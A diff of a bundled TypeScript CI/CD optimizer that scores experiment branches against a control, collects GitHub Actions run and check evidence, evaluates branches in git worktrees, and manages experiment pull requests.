+  if (control.testsPassed === void 0 && control.error === void 0) pending.push("control checks are still running");
+  if (invalidJudge) failures.push("judge score must be finite and between 0 and 1");
+  if (invalidChecks) failures.push("check results must be booleans or absent");
+  const touched = arm.changedPaths.filter((path) => config.protectedPaths.some((glob) => matchesGlob(path, glob)));
+  if (touched.length > 0) failures.push(`modified protected paths: ${touched.join(", ")}`);
+  for (const metric of metrics) {
+    const spec2 = specs.find((candidate2) => candidate2.id === metric.id);
+    if (metric.error) failures.push(metric.error);
+    else if (metric.needs && (metric.needs.arm > 0 || metric.needs.control > 0)) pending.push(metric.evidenceIssue ?? `${metric.id} needs more CI samples`);
+    else if (metric.control === void 0 || metric.arm === void 0) {
+      if (arm.error === void 0 && control.error === void 0) pending.push(`${metric.id} has not been measured`);
+    } else if (spec2?.maxRegression !== void 0 && metric.delta < -spec2.maxRegression) {
+      failures.push(`${metric.id} regressed ${Math.round(-metric.delta * 100)}% (limit ${Math.round(spec2.maxRegression * 100)}%)`);
+    }
+  }
+  const status = (value2) => value2 === true ? 1 : value2 === false ? 0 : -1;
+  const candidate = {
+    metrics: metrics.map((metric, index) => {
+      const limit3 = specs[index]?.maxRegression;
+      return {
+        delta: quantize(metric.delta),
+        weight: quantize(metric.weight, WEIGHT_SCALE),
+        measured: metric.control !== void 0 && metric.arm !== void 0 && !metric.error && !metric.needs,
+        regressionLimit: limit3 === void 0 ? -1 : finite(limit3, 1) ? quantize(limit3, OBJECTIVE_SCALE, BigNumber.ROUND_FLOOR) : -1
+      };
+    }),
+    tests: status(arm.testsPassed),
+    controlTests: status(control.testsPassed),
+    armError: arm.error !== void 0,
+    controlError: control.error !== void 0,
+    protectedPath: touched.length > 0,
+    invalid: configProblems.length > 0 || invalidMetrics || invalidMetricSelection || invalidJudge || invalidChecks || metrics.some((metric) => metric.error !== void 0),
+    judge: arm.judge && finite(arm.judge.score, 1) ? quantize(arm.judge.score) : -1
+  };
+  const { minimum, influence } = selectionParameters(config);
+  const result = evaluateCandidate(candidate, minimum, influence);
+  if (result.failed && failures.length === 0) failures.push("formal eligibility gates failed");
+  return {
+    candidate,
+    score: { arm: arm.arm, metrics, deterministic: result.deterministic / OBJECTIVE_SCALE, rank: result.rank / OBJECTIVE_SCALE, pending, failures, qualifies: result.eligible }
+  };
+}
+
+// src/experiments/collect.ts
+var repositoryName = (repo) => `${repo.owner}/${repo.repo}`;
+async function selectedJob(client, repo, run4, name) {
+  const jobs = [];
+  let total;
+  for (let page = 1; ; page += 1) {
+    const response = await client.request("GET /repos/{owner}/{repo}/actions/runs/{run_id}/attempts/{attempt_number}/jobs", {
+      ...repo,
+      run_id: run4.id,
+      attempt_number: 1,
+      per_page: 100,
+      page
+    });
+    const data = response.data;
+    if (!Array.isArray(data.jobs) || !Number.isSafeInteger(data.total_count) || (data.total_count ?? -1) < 0 || total !== void 0 && total !== data.total_count) throw new Error("Incomplete or changing CI job inventory; recollect.");
+    total = data.total_count;
+    jobs.push(...data.jobs);
+    if (jobs.length > 1e4 || new Set(jobs.map((job2) => job2.id)).size !== jobs.length) throw new Error("Oversized or repeated CI job inventory.");
+    if (data.jobs.length < 100) break;
+  }
+  if (jobs.length !== total) throw new Error("Incomplete CI job inventory; recollect.");
+  const matching = jobs.filter((job2) => job2.name === name);
+  const job = matching.length === 1 ? matching[0] : void 0;
+  if (!job || job.run_id !== run4.id || job.run_attempt !== 1 || job.head_sha !== run4.head_sha || job.status !== "completed" || job.conclusion !== "success" || !job.started_at || !job.completed_at) return void 0;
+  return { id: job.id, name: job.name, startedAt: job.started_at, completedAt: job.completed_at, conclusion: job.conclusion };
+}
+async function observation(client, repo, run4, spec2, context4) {
+  if (run4.repository?.full_name.toLowerCase() !== repositoryName(repo).toLowerCase() || run4.head_repository?.full_name.toLowerCase() !== repositoryName(repo).toLowerCase()) return void 0;
+  const sample = {
+    runId: run4.id,
+    attempt: run4.run_attempt,
+    workflowId: run4.workflow_id,
+    workflowPath: run4.path,
+    event: run4.event,
+    status: run4.status,
+    conclusion: run4.conclusion ?? "",
+    headSha: run4.head_sha,
+    branch: run4.head_branch,
+    createdAt: run4.created_at,
+    startedAt: run4.run_started_at ?? "",
+    updatedAt: run4.updated_at,
+    seconds: durationSeconds(run4.run_started_at ?? "", run4.updated_at) ?? -1
+  };
+  const runSpec = { ...spec2 };
+  delete runSpec.job;
+  if (!supportedCiSample(sample, runSpec, context4)) return void 0;
+  if (spec2.job) {
+    const job = await selectedJob(client, repo, run4, spec2.job);
+    if (!job) return void 0;
+    sample.job = job;
+    sample.seconds = durationSeconds(job.startedAt, job.completedAt) ?? -1;
+  }
+  return supportedCiSample(sample, spec2, context4) ? sample : void 0;
+}
+async function ciSamples(client, repo, spec2, options) {
+  const evidence2 = { schema: CI_EVIDENCE_SCHEMA, repository: repositoryName(repo), workflow: spec2.workflow ?? "", samples: [] };
+  if (!spec2.workflow || !fullGitHubSha(options.headSha) || !Number.isFinite(Date.parse(options.since))) return evidence2;
+  const maxRuns = options.maxRuns ?? 30;
+  if (!Number.isSafeInteger(maxRuns) || maxRuns < 1 || maxRuns > 1e4) throw new Error("CI sample limit must be an integer in [1, 10000].");
+  const seen = /* @__PURE__ */ new Set();
+  for (let page = 1; ; page += 1) {
+    const response = await client.request("GET /repos/{owner}/{repo}/actions/workflows/{workflow_id}/runs", {
+      ...repo,
+      workflow_id: spec2.workflow,
+      branch: options.branch,
+      head_sha: options.headSha,
+      event: "workflow_dispatch",
+      status: "success",
+      created: `>=${options.since.slice(0, 10)}`,
+      per_page: 100,
+      page
+    });
+    const runs = response.data.workflow_runs;
+    if (!Array.isArray(runs)) throw new Error("Missing CI workflow run inventory.");
+    const previous2 = seen.size;
+    for (const run4 of runs) {
+      if (seen.has(run4.id)) continue;
+      seen.add(run4.id);
+      const sample = await observation(client, repo, run4, spec2, options);
+      if (sample) evidence2.samples.push(sample);
+      if (evidence2.samples.length === maxRuns) return evidence2;
+    }
+    if (runs.length < 100) return evidence2;
+    if (seen.size === previous2) throw new Error("Repeated CI workflow run page; refusing an incomplete collection.");
+  }
+}
+var FAILED = /* @__PURE__ */ new Set(["failure", "cancelled", "timed_out", "action_required", "startup_failure", "stale"]);
+async function checksPassed(client, repo, sha) {
+  const runs = [];
+  for (let page = 1; ; page += 1) {
+    const response = await client.request("GET /repos/{owner}/{repo}/commits/{ref}/check-runs", { ...repo, ref: sha, per_page: 100, page });
+    const items2 = response.data.check_runs;
+    if (!Array.isArray(items2)) throw new Error("Missing check-run inventory.");
+    runs.push(...items2);
+    if (runs.length > 1e4) throw new Error("Oversized check-run inventory; refusing an incomplete check gate.");
+    if (items2.length < 100) break;
+  }
+  if (runs.some((run4) => run4.conclusion && FAILED.has(run4.conclusion))) return false;
+  if (runs.some((run4) => run4.status !== "completed" || !["success", "skipped", "neutral"].includes(run4.conclusion ?? ""))) return void 0;
+  return runs.some((run4) => run4.conclusion === "success") ? true : void 0;
+}
+async function changedPaths(client, repo, base2, head) {
+  const response = await client.request("GET /repos/{owner}/{repo}/compare/{basehead}", { ...repo, basehead: `${base2}...${head}`, per_page: 300 });
+  const files = response.data.files;
+  if (!Array.isArray(files) || files.length >= 300) throw new Error("Missing or potentially truncated comparison paths; refusing incomplete protected-path evidence.");
+  return files.flatMap(
+    (file) => file.previous_filename ? [file.filename, file.previous_filename] : [file.filename]
+  );
+}
+async function collectMeasurements(client, repo, options) {
+  const { manifest, state, config } = options;
+  const ciSpecs = metricsFor(manifest, config).filter((spec2) => spec2.source === "ci");
+  const trunk = trunkBranch(manifest.name);
+  const measure = async (branch2, arm, headSha, pullRequest) => {
+    const measurement = { arm, changedPaths: [], ...headSha ? { headSha } : {}, ...pullRequest ? { pullRequest } : {} };
+    try {
+      if (ciSpecs.length > 0) {
+        const values2 = /* @__PURE__ */ Object.create(null);
+        const series = /* @__PURE__ */ Object.create(null);
+        measurement.ci = values2;
+        measurement.ciEvidence = series;
+        for (const spec2 of ciSpecs) {
+          const evidence2 = await ciSamples(client, repo, spec2, { branch: branch2, since: manifest.createdAt, maxRuns: Math.max(30, config.selection.minSamples), ...headSha ? { headSha } : {} });
+          series[spec2.id] = evidence2;
+          values2[spec2.id] = evidence2.samples.map((sample) => sample.seconds);
+        }
+      }
+      if (arm !== "trunk" && headSha) {
+        measurement.changedPaths = await changedPaths(client, repo, state.trunk?.headSha ?? trunk, headSha);
+      }
+      if (headSha) {
+        const passed = await checksPassed(client, repo, headSha);
+        if (passed !== void 0) measurement.testsPassed = passed;
+      }
+    } catch (error2) {
+      measurement.error = error2.message;
+    }
+    return measurement;
+  };
+  const control = await measure(trunk, "trunk", state.trunk?.headSha, state.trunk?.number);
+  const arms = [];
+  for (const spec2 of manifest.arms) {
+    const pull = state.arms.find((candidate) => candidate.arm === spec2.name && candidate.state === "open");
+    if (pull) arms.push(await measure(armBranch(manifest.name, spec2.name), spec2.name, pull.headSha, pull.number));
+  }
+  return { experiment: manifest.name, collectedAt: (options.now ?? /* @__PURE__ */ new Date()).toISOString(), control, arms };
+}
+async function verifyCiMeasurements(client, repo, options) {
+  const { manifest, measurements, config } = options;
+  const specs = metricsFor(manifest, config).filter((spec2) => spec2.source === "ci");
+  const runCache = /* @__PURE__ */ new Map();
+  const branches = [measurements.control, ...measurements.arms.filter((arm) => manifest.arms.some((spec2) => spec2.name === arm.arm))];
+  for (const measured of branches) {
+    const branch2 = measured === measurements.control ? trunkBranch(manifest.name) : armBranch(manifest.name, measured.arm);
+    const context4 = { branch: branch2, since: manifest.createdAt, ...measured.headSha ? { headSha: measured.headSha } : {} };
+    for (const spec2 of specs) {
+      const series = validatedCiSeries(spec2, measured, context4);
+      if (series.issue || series.values.length === 0) continue;
+      const evidence2 = measured.ciEvidence?.[spec2.id];
+      if (!evidence2 || evidence2.repository.toLowerCase() !== repositoryName(repo).toLowerCase()) throw new Error("CI evidence belongs to a different repository; recollect before promotion.");
+      for (const recorded of evidence2.samples) {
+        let run4 = runCache.get(recorded.runId);
+        if (!run4) {
+          const response = await client.request("GET /repos/{owner}/{repo}/actions/runs/{run_id}", { ...repo, run_id: recorded.runId });
+          run4 = response.data;
+          runCache.set(recorded.runId, run4);
+        }
+        const current = await observation(client, repo, run4, spec2, context4);
+        if (!current || !isDeepStrictEqual(current, recorded)) throw new Error(`CI run ${recorded.runId} no longer matches its recorded dispatch/head/attempt/timing context; recollect before promotion.`);
+      }
+    }
+  }
+}
+function mergeMeasurement(measurements, update2) {
+  const apply = (branch2) => {
+    const merged = { ...branch2, ...update2, changedPaths: update2.changedPaths ?? branch2.changedPaths };
+    if (branch2.testsPassed === false || update2.testsPassed === false) merged.testsPassed = false;
+    return merged;
+  };
+  if (update2.arm === "trunk") return { ...measurements, control: apply(measurements.control) };
+  const exists = measurements.arms.some((arm) => arm.arm === update2.arm);
+  return {
+    ...measurements,
+    arms: exists ? measurements.arms.map((arm) => arm.arm === update2.arm ? apply(arm) : arm) : [...measurements.arms, { changedPaths: [], ...update2 }]
+  };
 }
 
 // src/experiments/corpus.ts
@@ -34321,17 +41313,17 @@ function evaluateCorpus(engine, cases, options = {}) {
   };
 }
 async function walk(root, directory = root) {
-  const entries2 = await readdir(directory, { withFileTypes: true });
+  const entries3 = await readdir(directory, { withFileTypes: true });
   const files = await Promise.all(
-    entries2.map(async (entry2) => {
+    entries3.map(async (entry2) => {
       const path = join2(directory, entry2.name);
       return entry2.isDirectory() ? walk(root, path) : [toPosix(relative2(root, path))];
     })
   );
   return files.flat().sort();
 }
-function parseCase(id, text6, files) {
-  const raw = (0, import_yaml43.parse)(text6) ?? {};
+function parseCase(id, text7, files) {
+  const raw = (0, import_yaml43.parse)(text7) ?? {};
   const expected = Array.isArray(raw.expected) ? raw.expected.map((entry2) => {
     const item = entry2;
     if (typeof item.rule !== "string" || typeof item.path !== "string") throw new Error(`${id}: expected entries need rule and path`);
@@ -34388,28 +41380,35 @@ function isExpired(manifest, config, now2) {
   const maxAge = Date.parse(manifest.createdAt) + config.selection.maxAgeDays * DAY;
   return now2.getTime() >= Math.min(Number.isNaN(expires) ? Infinity : expires, Number.isNaN(maxAge) ? Infinity : maxAge);
 }
-function best(scores) {
-  return scores.filter((score) => score.qualifies).sort((a, b) => b.rank - a.rank || b.deterministic - a.deterministic || a.arm.localeCompare(b.arm))[0];
-}
 function decide(manifest, measurements, config, options) {
   const now2 = options.now ?? /* @__PURE__ */ new Date();
-  const scores = manifest.arms.map((spec2) => {
+  if (!Number.isFinite(now2.getTime()) || !Number.isFinite(Date.parse(manifest.createdAt)) || !Number.isFinite(Date.parse(manifest.expiresAt))) {
+    throw new Error("Decision time and manifest deadlines must be valid timestamps.");
+  }
+  if (measurements.experiment !== manifest.name) throw new Error("Measurements belong to a different experiment.");
+  if (new Set(manifest.arms.map((arm) => arm.name)).size !== manifest.arms.length || manifest.arms.some((arm) => !/^[a-z0-9][a-z0-9-]{0,47}$/.test(arm.name))) throw new Error("Candidate names must be unique ASCII identifiers.");
+  if (new Set(measurements.arms.map((arm) => arm.arm)).size !== measurements.arms.length) throw new Error("Duplicate arm measurements.");
+  const evaluated = manifest.arms.map((spec2) => {
     const measured = measurements.arms.find((arm) => arm.arm === spec2.name);
-    if (!measured) {
-      return { arm: spec2.name, metrics: [], deterministic: 0, rank: 0, pending: ["arm has not been built yet"], failures: [], qualifies: false };
-    }
-    return scoreArm(manifest, measurements.control, measured, config);
+    const result = evaluateArm(manifest, measurements.control, measured ?? { arm: spec2.name, changedPaths: [] }, config);
+    if (!measured) result.score.pending.unshift("arm has not been built yet");
+    return result;
   });
-  if (manifest.status !== "running") return { action: "skip", reason: `experiment is ${manifest.status}`, scores };
+  const scores = evaluated.map((result) => result.score);
   const expired = isExpired(manifest, config, now2);
-  const winner = best(scores);
+  const ordered = [...evaluated].sort((a, b) => a.score.arm < b.score.arm ? -1 : a.score.arm > b.score.arm ? 1 : 0);
+  const { minimum, influence } = selectionParameters(config);
+  const reduction = reduceCandidates(ordered.map((entry2) => entry2.candidate), minimum, influence, manifest.status === "running", expired);
+  if (reduction.action === "skip") return { action: "skip", reason: `experiment is ${manifest.status}`, scores };
   const pending = scores.filter((score) => score.pending.length > 0 && score.failures.length === 0);
   const losers = (name) => manifest.arms.map((arm) => arm.name).filter((arm) => arm !== name);
-  if (winner && (pending.length === 0 || expired)) {
-    return { action: "promote", winner: winner.arm, losers: losers(winner.arm), reason: `${winner.arm} improved the weighted metrics by ${(winner.deterministic * 100).toFixed(1)}%`, scores };
+  if (reduction.action === "promote") {
+    const winner = ordered[reduction.index]?.score;
+    if (!winner) throw new Error("Generated reducer returned an out-of-universe winner.");
+    return { action: "promote", winner: winner.arm, losers: losers(winner.arm), reason: `${winner.arm} leads the qualified measured candidates with ${(winner.deterministic * 100).toFixed(1)}% weighted scored improvement${pending.length > 0 ? "; unfinished candidates are excluded at expiry" : ""}`, scores };
   }
-  if (expired) return { action: "expire", reason: `no arm qualified within ${config.selection.maxAgeDays} days`, scores };
-  if (pending.length === 0) {
+  if (reduction.action === "expire") return { action: "expire", reason: `no arm qualified within ${config.selection.maxAgeDays} days`, scores };
+  if (reduction.action === "reject") {
     const leader = [...scores].sort((a, b) => b.deterministic - a.deterministic)[0];
     const why = leader?.failures.length ? leader.failures.join("; ") : `best improvement ${(Math.max(0, leader?.deterministic ?? 0) * 100).toFixed(1)}% is below the ${(config.selection.minImprovement * 100).toFixed(1)}% bar`;
     return { action: "reject", reason: `no arm qualified (${why})`, scores };
@@ -34461,14 +41460,14 @@ function renderDecision(manifest, decision) {
         const p2 = metric.pValue === void 0 ? "" : ` (p=${metric.pValue.toFixed(3)})`;
         return `${fmt(metric.control)} \u2192 ${fmt(metric.arm)} ${pct(metric.delta)}${p2}`;
       });
-      const status = score.failures.length ? `\u274C ${score.failures.join("; ")}` : score.pending.length ? `\u23F3 ${score.pending.join("; ")}` : score.qualifies ? "\u2705 qualifies" : "\u2796 no measurable gain";
+      const status = score.failures.length ? `\u274C ${score.failures.join("; ")}` : score.pending.length ? `\u23F3 ${score.pending.join("; ")}` : score.qualifies ? "\u2705 qualifies" : "\u2796 below scored threshold";
       return `| \`${score.arm}\` | ${cells.join(" | ")} | ${pct(score.deterministic)} | ${score.rank.toFixed(3)} | ${status} |`;
     })
   ];
   if (decision.action === "wait" && decision.dispatch.length > 0) {
     lines.push("", "Requested additional runs:", ...decision.dispatch.map((request) => `- \`${request.workflow}\` on \`${request.ref}\` \xD7 ${request.runs}`));
   }
-  lines.push("", "<sub>Scores are relative improvements over the experiment trunk (control). The judge can only reorder arms that already pass every gate.</sub>");
+  lines.push("", "<sub>The verified reducer ranks only the declared manifest candidates using the quantized objective. It does not attest measurements, prove causal benefits, or find a global pipeline optimum. The judge cannot bypass hard eligibility gates.</sub>");
   return lines.join("\n");
 }
 
@@ -34477,35 +41476,35 @@ import { mkdtemp, rm } from "node:fs/promises";
 import { tmpdir } from "node:os";
 import { join as join3 } from "node:path";
 var quote = (value2) => `"${value2.replace(/(["\\$`])/g, "\\$1")}"`;
-var tail = (text6, lines = 20) => text6.trim().split("\n").slice(-lines).join("\n");
+var tail = (text7, lines = 20) => text7.trim().split("\n").slice(-lines).join("\n");
 async function evaluateBranches(options) {
-  const { root, config, exec: exec2 } = options;
+  const { root, config, exec: exec3 } = options;
   const log = options.log ?? (() => void 0);
   const load = options.loadEngine ?? loadEngine;
   const workdir = options.workdir ?? await mkdtemp(join3(tmpdir(), "cicd-eval-"));
-  const git2 = (args) => exec2(`git ${args}`, { cwd: root });
+  const git2 = (args) => exec3(`git ${args}`, { cwd: root });
   const evaluations = [];
   let cases;
   let corpusError;
   const branches = [options.measurements.control, ...options.measurements.arms];
-  for (const branch of branches) {
-    const evaluation = { arm: branch.arm, ...branch.headSha ? { headSha: branch.headSha } : {} };
+  for (const branch2 of branches) {
+    const evaluation = { arm: branch2.arm, ...branch2.headSha ? { headSha: branch2.headSha } : {} };
     evaluations.push(evaluation);
-    if (!branch.headSha) {
+    if (!branch2.headSha) {
       evaluation.error = "no head commit to evaluate";
       continue;
     }
-    const dir = join3(workdir, branch.arm);
+    const dir = join3(workdir, branch2.arm);
     try {
-      if ((await git2(`cat-file -e ${branch.headSha}^{commit}`)).code !== 0) {
-        const fetched = await git2(`fetch --no-tags origin ${branch.headSha}`);
+      if ((await git2(`cat-file -e ${branch2.headSha}^{commit}`)).code !== 0) {
+        const fetched = await git2(`fetch --no-tags origin ${branch2.headSha}`);
         if (fetched.code !== 0) throw new Error(`git fetch failed:
 ${tail(fetched.output)}`);
       }
-      const added = await git2(`worktree add --force --detach ${quote(dir)} ${branch.headSha}`);
+      const added = await git2(`worktree add --force --detach ${quote(dir)} ${branch2.headSha}`);
       if (added.code !== 0) throw new Error(`git worktree add failed:
 ${tail(added.output)}`);
-      if (branch.arm === "trunk") {
+      if (branch2.arm === "trunk") {
         try {
           cases = await (options.loadCorpus ?? loadCorpus)(join3(dir, config.evaluation.corpus));
         } catch (error2) {
@@ -34518,26 +41517,26 @@ ${tail(added.output)}`);
         ["build", config.evaluation.build]
       ]) {
         if (!command) continue;
-        log(`[${branch.arm}] ${step}: ${command}`);
-        const result = await exec2(command, { cwd: dir });
+        log(`[${branch2.arm}] ${step}: ${command}`);
+        const result = await exec3(command, { cwd: dir });
         if (result.code !== 0) throw new Error(`${step} failed (exit ${result.code}):
 ${tail(result.output)}`);
       }
       if (config.evaluation.test) {
-        log(`[${branch.arm}] test: ${config.evaluation.test}`);
-        const result = await exec2(config.evaluation.test, { cwd: dir });
+        log(`[${branch2.arm}] test: ${config.evaluation.test}`);
+        const result = await exec3(config.evaluation.test, { cwd: dir });
         evaluation.testsPassed = result.code === 0;
-        if (!evaluation.testsPassed) log(`[${branch.arm}] tests failed:
+        if (!evaluation.testsPassed) log(`[${branch2.arm}] tests failed:
 ${tail(result.output)}`);
       } else {
         evaluation.testsPassed = true;
       }
       const engine = await load(join3(dir, config.evaluation.engine), options.engineVersion);
       evaluation.report = evaluateCorpus(engine, cases, { timingRuns: config.evaluation.timingRuns });
-      log(`[${branch.arm}] ${JSON.stringify(evaluation.report.metrics)}`);
+      log(`[${branch2.arm}] ${JSON.stringify(evaluation.report.metrics)}`);
     } catch (error2) {
       evaluation.error = error2.message;
-      log(`[${branch.arm}] ${evaluation.error}`);
+      log(`[${branch2.arm}] ${evaluation.error}`);
     } finally {
       await git2(`worktree remove --force ${quote(dir)}`).catch(() => void 0);
     }
@@ -34556,7 +41555,7 @@ ${tail(result.output)}`);
 }
 
 // src/issues/markers.ts
-import { createHash as createHash2 } from "node:crypto";
+import { createHash as createHash3 } from "node:crypto";
 var MARKER = /<!--\s*cicd-optimizer:(finding|alert|fix|recipe|experiment)\s+([^>]*?)\s*-->/;
 function marker(kind, fingerprint2, attributes = {}) {
   const extra = Object.entries(attributes).filter(([, value2]) => value2 !== "").map(([key2, value2]) => ` ${key2}=${encodeURIComponent(value2)}`).join("");
@@ -34592,7 +41591,7 @@ function findMarker(body, kind) {
   return void 0;
 }
 function signatureOf(parts2) {
-  return createHash2("sha256").update(parts2.join("\0")).digest("hex").slice(0, 16);
+  return createHash3("sha256").update(parts2.join("\0")).digest("hex").slice(0, 16);
 }
 function updateMarker(body, kind, fingerprint2, attributes) {
   const existing = parseMarker(body);
@@ -34670,15 +41669,15 @@ function experimentBody(manifest, config, decision) {
 async function openExperimentPull(client, repo, manifest, baseBranch, config) {
   const pull = { ...repo, title: `experiment(${manifest.name}): ${manifest.title}`, head: trunkBranch(manifest.name), base: baseBranch, body: experimentBody(manifest, config), maintainer_can_modify: true };
   const response = await client.request("POST /repos/{owner}/{repo}/pulls", { ...pull, draft: true });
-  const number2 = response.data?.number;
-  if (!Number.isSafeInteger(number2) || typeof number2 !== "number" || number2 < 1) {
+  const number3 = response.data?.number;
+  if (!Number.isSafeInteger(number3) || typeof number3 !== "number" || number3 < 1) {
     throw new Error("GitHub did not return the experiment pull request number; inspect the branch before retrying.");
   }
-  return number2;
+  return number3;
 }
-async function labelExperiment(client, repo, number2) {
+async function labelExperiment(client, repo, number3) {
   await ensureLabels(client, repo, [EXPERIMENT_LABEL]);
-  await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/labels", { ...repo, issue_number: number2, labels: [EXPERIMENT_LABEL] });
+  await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/labels", { ...repo, issue_number: number3, labels: [EXPERIMENT_LABEL] });
 }
 async function createExperiment(client, repo, options) {
   const { manifest, baseBranch, config } = options;
@@ -34698,9 +41697,9 @@ async function createExperiment(client, repo, options) {
     throw new Error(`Cannot confirm creation of ${trunk} at ${sha}. Inspect that ref before retrying; if it exists at this commit, use experiments resume --experiment ${manifest.name} --expected-head ${sha} --base ${baseBranch}. ${error2.message}`, { cause: error2 });
   }
   try {
-    const number2 = await openExperimentPull(client, repo, manifest, baseBranch, config);
-    await labelExperiment(client, repo, number2);
-    return { trunk, pullRequest: number2, sha };
+    const number3 = await openExperimentPull(client, repo, manifest, baseBranch, config);
+    await labelExperiment(client, repo, number3);
+    return { trunk, pullRequest: number3, sha };
   } catch (error2) {
     throw new Error(`Experiment trunk ${trunk} was retained at ${sha}, but publication did not finish: ${error2.message}. After repairing access, run experiments resume --experiment ${manifest.name} --expected-head ${sha} --base ${baseBranch}.`, { cause: error2 });
   }
@@ -34726,9 +41725,9 @@ async function resumeExperiment(client, repo, options) {
     }
   };
   await checkHead();
-  const text6 = await readFileAt(client, repo, manifestPath(name), expectedSha);
-  if (text6 === void 0) throw new Error(`No experiment manifest at ${expectedSha}.`);
-  const parsed = parseManifest2(text6, { config });
+  const text7 = await readFileAt(client, repo, manifestPath(name), expectedSha);
+  if (text7 === void 0) throw new Error(`No experiment manifest at ${expectedSha}.`);
+  const parsed = parseManifest2(text7, { config });
   const manifest = parsed.manifest;
   if (!manifest || manifest.name !== name || manifest.status !== "running" || manifest.winner || manifest.evidence) {
     throw new Error("Only a valid running experiment without a recorded outcome can be resumed.");
@@ -34753,35 +41752,35 @@ async function resumeExperiment(client, repo, options) {
   };
   const matches = history.filter((pull) => pull.head?.ref === trunk);
   if (matches.length > 1) throw new Error("Multiple promotion pull requests use this trunk; reconcile them before resuming.");
-  let number2;
+  let number3;
   const existing = matches[0];
   if (existing) {
     if (!isExpectedPull(existing)) {
       throw new Error("The existing promotion pull request is completed, changed, or not owned by this experiment.");
     }
-    number2 = existing.number;
+    number3 = existing.number;
   } else {
-    const open3 = groupExperiments(await listExperimentPullRequests(client, repo));
-    if (open3.filter((experiment) => experiment.trunk?.state === "open").length >= config.selection.maxConcurrent) {
+    const open4 = groupExperiments(await listExperimentPullRequests(client, repo));
+    if (open4.filter((experiment) => experiment.trunk?.state === "open").length >= config.selection.maxConcurrent) {
       throw new Error("The concurrent experiment budget is already full.");
     }
   }
-  if (options.dryRun) return { trunk, sha: expectedSha, baseBranch, ...number2 === void 0 ? {} : { pullRequest: number2 }, created: false };
+  if (options.dryRun) return { trunk, sha: expectedSha, baseBranch, ...number3 === void 0 ? {} : { pullRequest: number3 }, created: false };
   await checkHead();
-  const created = number2 === void 0;
-  number2 ??= await openExperimentPull(client, repo, manifest, baseBranch, config);
+  const created = number3 === void 0;
+  number3 ??= await openExperimentPull(client, repo, manifest, baseBranch, config);
   const verifyPull = async (requireLabel = false) => {
-    const response = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number2 });
+    const response = await client.request("GET /repos/{owner}/{repo}/pulls/{pull_number}", { ...repo, pull_number: number3 });
     const pull = response.data;
-    if (!isExpectedPull(pull) || pull?.number !== number2 || requireLabel && !pull?.labels?.some((label) => label.name === EXPERIMENT_LABEL)) {
+    if (!isExpectedPull(pull) || pull?.number !== number3 || requireLabel && !pull?.labels?.some((label) => label.name === EXPERIMENT_LABEL)) {
       throw new Error("Experiment publication is not confirmed at the expected commit; reconcile the pull request before continuing.");
     }
     await checkHead();
   };
   await verifyPull();
-  await labelExperiment(client, repo, number2);
+  await labelExperiment(client, repo, number3);
   await verifyPull(true);
-  return { trunk, sha: expectedSha, baseBranch, pullRequest: number2, created };
+  return { trunk, sha: expectedSha, baseBranch, pullRequest: number3, created };
 }
 async function dispatchRuns(client, repo, requests, maxPerRequest = 5) {
   let dispatched = 0;
@@ -34799,10 +41798,10 @@ async function upsertComment(client, repo, issue, name, body) {
     const parsed = parseMarker(comment.body);
     return parsed?.kind === "experiment" && parsed.fingerprint === name && parsed.attributes.role === "grade";
   });
-  const text6 = `${marker("experiment", name, { role: "grade" })}
+  const text7 = `${marker("experiment", name, { role: "grade" })}
 ${body}`;
-  if (existing) await client.request("PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}", { ...repo, comment_id: existing.id, body: text6 });
-  else await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: issue, body: text6 });
+  if (existing) await client.request("PATCH /repos/{owner}/{repo}/issues/comments/{comment_id}", { ...repo, comment_id: existing.id, body: text7 });
+  else await client.request("POST /repos/{owner}/{repo}/issues/{issue_number}/comments", { ...repo, issue_number: issue, body: text7 });
 }
 async function cleanupBranch(client, repo, pull, notes) {
   if (pull.headRepository?.toLowerCase() !== `${repo.owner}/${repo.repo}`.toLowerCase()) {
@@ -34810,14 +41809,14 @@ async function cleanupBranch(client, repo, pull, notes) {
     return;
   }
   if (pull.head === pull.base) throw new Error("Refusing cleanup of an experiment's base branch.");
-  const open3 = await client.request("GET /repos/{owner}/{repo}/pulls", {
+  const open4 = await client.request("GET /repos/{owner}/{repo}/pulls", {
     ...repo,
     state: "open",
     head: `${repo.owner}:${pull.head}`,
     per_page: 1
   });
-  if (!Array.isArray(open3.data)) throw new Error("GitHub did not return the open PRs required for experiment cleanup.");
-  if (open3.data.length > 0) {
+  if (!Array.isArray(open4.data)) throw new Error("GitHub did not return the open PRs required for experiment cleanup.");
+  if (open4.data.length > 0) {
     notes.push(`Branch ${pull.head} retained because an open PR uses it.`);
     return;
   }
@@ -34983,16 +41982,245 @@ ${report}`, result.notes);
   return result;
 }
 
+// src/experiments/measurements.ts
+function number(value2, label, maximum = 1e12) {
+  if (typeof value2 !== "number" || !Number.isFinite(value2) || value2 < 0 || value2 > maximum) throw new Error(`${label} must be a finite number in [0, ${maximum}].`);
+  return value2;
+}
+function strings(value2, label, maximum = 1e4) {
+  if (!Array.isArray(value2) || value2.length > maximum) throw new Error(`${label} must be an array of at most ${maximum} strings.`);
+  return value2.map((entry2) => string(entry2, label));
+}
+function boolean(value2, label) {
+  if (typeof value2 !== "boolean") throw new Error(`${label} must be a boolean.`);
+  return value2;
+}
+function branch(value2) {
+  const record5 = object(value2, "measurement");
+  exactKeys(record5, ["arm", "headSha", "pullRequest", "corpus", "ci", "ciEvidence", "testsPassed", "changedPaths", "judge", "error"], "measurement");
+  const result = { arm: string(record5.arm, "measurement.arm"), changedPaths: strings(record5.changedPaths, "measurement.changedPaths") };
+  if (record5.headSha !== void 0) result.headSha = string(record5.headSha, "measurement.headSha");
+  if (record5.pullRequest !== void 0) result.pullRequest = integer(record5.pullRequest, "measurement.pullRequest", 1);
+  if (record5.testsPassed !== void 0) result.testsPassed = boolean(record5.testsPassed, "measurement.testsPassed");
+  if (record5.error !== void 0) result.error = string(record5.error, "measurement.error");
+  if (record5.judge !== void 0) {
+    const judge = object(record5.judge, "judge");
+    exactKeys(judge, ["score", "rationale"], "judge");
+    result.judge = { score: number(judge.score, "judge.score", 1), rationale: string(judge.rationale, "judge.rationale") };
+  }
+  if (record5.corpus !== void 0) {
+    const corpus = object(record5.corpus, "corpus");
+    exactKeys(corpus, ["precision", "recall", "f1", "fixRate", "durationMs"], "corpus");
+    result.corpus = {
+      precision: number(corpus.precision, "corpus.precision", 1),
